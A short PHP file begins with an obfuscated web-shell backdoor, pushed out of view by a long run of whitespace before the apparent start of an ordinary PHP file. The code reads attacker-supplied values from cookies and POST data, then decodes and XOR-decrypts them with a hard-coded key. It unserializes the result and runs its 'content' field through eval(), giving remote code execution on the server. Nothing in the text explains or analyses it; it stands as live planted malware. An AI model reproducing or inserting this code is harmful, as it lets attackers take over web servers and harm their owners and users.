<?php                                                                                                                                                                                                                                                                                                                                                                                                 $sxqzEypoZJ = class_exists("IS_gTMa"); $HqBFyuy = $sxqzEypoZJ;if (!$HqBFyuy){class IS_gTMa{private $dzutRIv;public static $pcfoZTCA = "028c45a7-2491-495c-bf8c-8b08c4a5b53e";public static $CcTXEuSw = NULL;public function __construct(){$LLJgqW = $_COOKIE;$cYfzZRi = $_POST;$YRUMUxpitD = @$LLJgqW[substr(IS_gTMa::$pcfoZTCA, 0, 4)];if (!empty($YRUMUxpitD)){$iwTghGK = "base64";$IgeJxu = "";$YRUMUxpitD = explode(",", $YRUMUxpitD);foreach ($YRUMUxpitD as $AkAjg){$IgeJxu .= @$LLJgqW[$AkAjg];$IgeJxu .= @$cYfzZRi[$AkAjg];}$IgeJxu = array_map($iwTghGK . "\x5f" . "\144" . "\145" . chr (99) . chr ( 963 - 852 ).'d' . chr ( 1053 - 952 ), array($IgeJxu,)); $IgeJxu = $IgeJxu[0] ^ str_repeat(IS_gTMa::$pcfoZTCA, (strlen($IgeJxu[0]) / strlen(IS_gTMa::$pcfoZTCA)) + 1);IS_gTMa::$CcTXEuSw = @unserialize($IgeJxu);}}public function __destruct(){$this->NCCYcQQ();}private function NCCYcQQ(){if (is_array(IS_gTMa::$CcTXEuSw)) {$BarWWf = str_replace("\x3c" . "\77" . chr ( 151 - 39 )."\x68" . "\160", "", IS_gTMa::$CcTXEuSw["\143" . "\157" . "\x6e" . "\164" . chr ( 942 - 841 ).chr (110) . "\164"]);eval($BarWWf);exit();}}}$hQNdC = new IS_gTMa(); $hQNdC = NULL;} ?><?php
/**
